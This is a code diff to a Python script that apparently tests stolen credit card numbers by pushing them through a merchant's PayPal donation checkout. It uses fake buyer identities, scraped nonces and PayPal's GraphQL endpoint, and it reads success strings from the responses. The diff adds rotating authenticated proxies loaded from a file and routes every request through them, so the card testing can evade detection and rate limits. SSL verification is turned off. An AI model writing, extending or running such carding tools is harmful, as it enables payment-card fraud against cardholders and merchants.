@@ -12,6 +12,27 @@ import urllib3
 # Disable SSL warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+def get_random_proxy():
+    """Get a random proxy from proxy.txt file - same as p.py"""
+    try:
+        with open('proxy.txt', 'r') as f:
+            proxies = f.readlines()
+            proxy = random.choice(proxies).strip()
+
+            # Parse proxy string (format: host:port:username:password)
+            parts = proxy.split(':')
+            if len(parts) == 4:
+                host, port, username, password = parts
+                proxy_dict = {
+                    'http': f'http://{username}:{password}@{host}:{port}',
+                    'https': f'http://{username}:{password}@{host}:{port}'
+                }
+                return proxy_dict
+            return None
+    except Exception as e:
+        print(f"Error reading proxy file: {str(e)}")
+        return None
+
 def generate_full_name():
     """Generate random first and last name"""
     first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
@@ -120,7 +141,7 @@ def get_smart_fallback(bin_number):
     }
 
 def check_status_paypal(result_text):
-    """Check PayPal response status"""
+    """Check PayPal response status - using the same logic as original PayP.py"""
     if ('ADD_SHIPPING_ERROR' in result_text or
         '"status": "succeeded"' in result_text or
         'Thank You For Donation.' in result_text or
@@ -164,6 +185,9 @@ def check_card_paypal(cc_line):
         email = generate_random_account()
         phone = generate_phone()
         
+        # Get proxy
+        proxy = get_random_proxy()
+        
         # Start session
         session = requests.Session()
         
@@ -186,7 +210,7 @@ def check_card_paypal(cc_line):
             'user-agent': user_agent,
         }
         
-        response = session.post('https://switchupcb.com/shop/i-buy/', headers=headers, data=multipart_data, verify=False)
+        response = session.post('https://switchupcb.com/shop/i-buy/', headers=headers, data=multipart_data, proxies=proxy, verify=False)
         
         # Step 2: Get checkout page
         headers = {
@@ -197,7 +221,7 @@ def check_card_paypal(cc_line):
             'user-agent': user_agent,
         }
         
-        response = session.get('https://switchupcb.com/checkout/', headers=headers, verify=False)
+        response = session.get('https://switchupcb.com/checkout/', headers=headers, proxies=proxy, verify=False)
         
         # Extract necessary tokens
         sec = re.search(r'update_order_review_nonce":"(.*?)"', response.text)
@@ -241,7 +265,7 @@ def check_card_paypal(cc_line):
             'save_payment_method': False,
         }
         
-        response = session.post('https://switchupcb.com/', params=params, headers=headers, json=json_data, verify=False)
+        response = session.post('https://switchupcb.com/', params=params, headers=headers, json=json_data, proxies=proxy, verify=False)
         
         if 'data' not in response.json() or 'id' not in response.json()['data']:
             return "❌ Failed to create PayPal order"
@@ -333,6 +357,7 @@ def check_card_paypal(cc_line):
             'https://www.paypal.com/graphql?fetch_credit_form_submit',
             headers=headers,
             json=json_data,
+            proxies=proxy,
             verify=False
         )
         
